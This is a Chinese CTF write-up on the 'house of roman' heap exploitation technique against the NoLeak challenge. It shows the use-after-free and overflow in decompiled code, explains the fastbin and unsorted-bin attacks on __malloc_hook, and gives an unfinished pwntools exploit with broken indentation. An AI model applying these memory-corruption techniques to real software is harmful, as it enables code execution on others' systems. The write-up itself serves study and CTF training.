#qctf noleak

**house of roman** 
题目为xman选拔赛 Noleak 
当时没做出来，今天有时间看了下wp 
题目主要是利用了aslr的低地址随机化程度不高，利用局部写可以得到一些我们想要的值， 
题目中的漏洞很明显，一个是delete函数没有对指针清零，另一个就是update函数可以越界写 
主要的难点就是没有printf之类的函数，不能泄露地址

```
void delete()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  say("Index: ", 7u);
  v0 = getinput();
  if ( v0 <= 9 )
    free(heaplst[v0]);                          // didnt nullified
}      

                                     // can uaf maybe
```

——————————————————————————————————————————————————————

```
int edit()
    {
      void *v0; // rax
      unsigned int nbytes; // ST0C_4
      int idx; // [rsp+8h] [rbp-8h]

      say("Index: ", 7u);
  LODWORD(v0) = getinput();
  idx = v0;
  if ( v0 <= 9 )
  {
    v0 = heaplst[v0];
    if ( v0 )
    {
      say("Size: ", 6u);
      nbytes = getinput();                      // over flow
      say("Data: ", 6u);
      LODWORD(v0) = read(0, heaplst[idx], nbytes);
    }
  }
  return v0;
}
```

首先构造五个堆块，零号堆块的作用主要是堆结构的对齐以及修改一号堆块大小，风水堆块 
其后的四个堆块分别大小为 0xd0 0x70 0xd0 0x70 
目的主要是要利用unsortedbinattack以及fastbinattck，并且要保证不合并以及不被topchunk吞掉 
控制一号堆块中的内容，使其看起来像是两个堆块，并且前一个堆块的大小为0x70，为后续的fastbin attack做准备 
delete掉一号堆块和三号堆块，这时一号堆块fd指向mainarena，bk指向3号堆块 
再次分配1号堆块，使原有的指针信息得以保留 
释放2号和四号堆块，使其进入fastbin 
利用0号堆块修改1号堆块的size为0x71，并利用uaf修改4号堆块的指针低字节，由于堆上的偏移固定，则可以令其指向1号堆块 
修改一号堆块的fd指针的低2字节令其指向malloc hook - 0x23处 
分配三个0x70大小的堆块，这样第三个堆块就是在mallochook附近了 
我们现在需要向malloc hook 写入onegadget的地址，但是现在我们并不具有具体地地址信息，我们知道通过unsortedbinattack可以向任意地址写入固定值，这个固定值通过修改低字节可以得到onegadget的地址 
这样我们修改三号堆块的bk指针使其指向malloc hook - 0x10，向malloc hook 写入一个main_arena 地址，通过修改刚刚申请到的位于malloc hook附近的堆块，改写其低字节，我们就可以达到使malloc hook 指向onegadget的效果 
double free即可getshell

exp:

```
from pwn import *
context.log_level = 'debug'
context.arch = "amd64"
io = process('./NoLeak')
elf = ELF('NoLeak')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one = 0xe9415
def add(size,data):
    io.recvuntil(':')
    io.sendline('1')
    io.recvuntil('Size:')
    io.sendline(str(size))
    io.recvuntil

(':')
        io.sendline(data)
    def delete(index):
        io.recvuntil(':')
        io.sendline('2')
        io.recvuntil('Index:')
        io.sendline(str(index))
    def update(index,size,data):
        io.recvuntil(':')
        io.sendline('3')
        io.recvuntil('Index:')
        io.sendline(str(index))
        io.recvuntil('Size:')
        io.sendline(str(size))
        io.recvuntil('Data:')
        io.sendline(data)
    add(0x10,'A'*0x10)#0
    add(0xc0,'B'*0xc0)#1
    add(0x60,'C'*0x60)#2
    add(0xc0,'D'*0xc0)#3
    add(0x60,'E'*0x60)#4

    update(1,0xc0,'B'*0x68 + p64(0x61)) #split 1 to 2 chunks
    delete(1)
    delete(3)
    add(0xc0,'')#5 == 2
    delete(2)
    delete(4)
    update(0,0x20,'A'*0x18 + p64(0x71))
    update(4,1,'\x20')
    update(2,1,'\x1d')
    add(0x60,'E'*0x60)#6
    add(0x60,'C'*0x60)#7
    add(0x60,'')#8 --- mlh
    delete(7)
    update(7,8,p64(0))
    update(3,0x10,p64(0)+'\x0d')
    add(0xc0,'D'*0xc0)
    #_______brute force_______#
    update(8,0x13,'A'*3 + '\x15\x94\x0e')
    delete(0)
    delete(0)
    io.interactive()
    gdb.attach(io)
    raw_input()
```

exp并没有写完，因为我的虚拟机有些问题。。而且还要写暴力破解，懒 
总结一下： 
house of roman 主要就是通过改写低字节来控制指针的指向，通过fastbin的fd以及unsortedbin的fd，bk指针的一些特性达到控制堆地址和libc地址的效果，本质上是unsorted bin attack 结合 fastbin attack 
首先控制写malloc hook 的堆块，而后利用unsorted bin attack向mallochook写入固定值，改写低地址 